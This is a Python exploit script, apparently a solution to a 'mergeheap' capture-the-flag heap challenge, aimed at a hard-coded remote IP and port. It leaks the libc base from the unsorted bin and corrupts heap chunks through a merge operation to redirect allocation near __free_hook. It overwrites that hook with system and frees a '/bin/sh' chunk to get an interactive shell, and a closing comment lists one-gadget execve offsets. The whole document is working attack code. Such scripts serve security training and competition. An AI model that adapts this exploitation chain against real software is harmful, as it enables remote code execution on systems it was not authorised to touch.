from PwnContext import *

if __name__ == '__main__':        
    # context.terminal = ['tmux', 'splitw', '-h'] # uncomment this if you use tmux
    #context.log_level = 'debug'
    # functions for quick script
    s       = lambda data               :ctx.send(str(data))        #in case that data is an int
    sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) 
    sl      = lambda data               :ctx.sendline(str(data)) 
    sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) 
    r       = lambda numb=4096          :ctx.recv(numb)
    ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)
    irt     = lambda                    :ctx.interactive()
    rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)
    dbg     = lambda gs='', **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
    # misc functions
    uu32    = lambda data   :u32(data.ljust(4, '\0'))
    uu64    = lambda data   :u64(data.ljust(8, '\0'))

    ctx.binary = './mergeheap'
    #elf=ELF('./hash')
    #ctx.remote_libc = '/lib/x86_64-linux-gnu/libc-2.27.so'
    ctx.remote = ('152.136.210.218', 8001)
    #ctx.debug_remote_libc = True # True for debugging remote libc, false for local.
    ctx.symbols = {'lst':0x2020a0,'sz':0x202060}
    ctx.breakpoints = [0x10ca,0xd50]
    rs('remote')
    #rs('remote') # uncomment this for exploiting remote target

    #libc = ctx.libc # ELF object of the corresponding libc.
    libc = ELF('./libc-2.27.so')
    # ipy() # if you have ipython, you can use this to check variables.
    
    def add(size,content=''):
        sla('>>',1)
        sla('len:',size)
        if size:
            sa('content:',content)
    def show(idx):
        sla('>>',2)
        sla('idx:',idx)
    def delete(idx):
        sla('>>',3)
        sla('idx',idx)
    def merge(idx1,idx2):
        sla('>>',4)
        sla('idx1:',idx1)
        sla('idx2:',idx2)
    

    #leak heap and libc
    add(0x80,'0\n')
    #add(0x3f0,'2'*0x3f0)
    add(0x68,'1'*0x68)
    add(0x60,'2\n')
    add(0x60,'3\n')
    add(0x80,'4\n')
    add(0x80,'5\n')
    add(0x80,'6\n')
    add(0x80,'7\n')
    add(0x80,'8\n')
    add(0x80,'9\n')
    add(0x80,'10\n')
    add(0,'')
    add(0x60,'12\n')
    add(0x60,'13\n')
    
    
    
    for i in range(7):
        delete(i+4)
    delete(0)
    for i in range(7):
        add(0x80,str(i)+'\n')
    add(0,'')#10 unso
    show(10)
    libc_leak = uu64(r(6))
    libc_base = libc_leak-0x3ebd20
    libc.address = libc_base
    success('libc_base = {}'.format(hex(libc_base)))
    f_hk = libc.sym['__free_hook']
    #one = 0x10a38c+libc_base
    sys = libc.sym['system']
    success('m_hk = {}'.format(hex(f_hk)))
    #recover
    #dbg()
    add(0x68,'a'*(0x68-18)+'a'*8+p64(f_hk-0x23)+'\n')#14
    delete(7)
    delete(8)
    delete(9)
    delete(12)
    delete(13)
    delete(3)
    delete(2)

    merge(10,11)#2
    merge(10,2)#3
    merge(10,3)#8
    merge(7,14)#8
    
    add(0x60,'/bin/sh\x00\n')#9
    add(0x60,'a'*0x23+p64(sys)+'\n')#12
    delete(9)
    #dbg()

    irt()
    '''
    0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

    '''
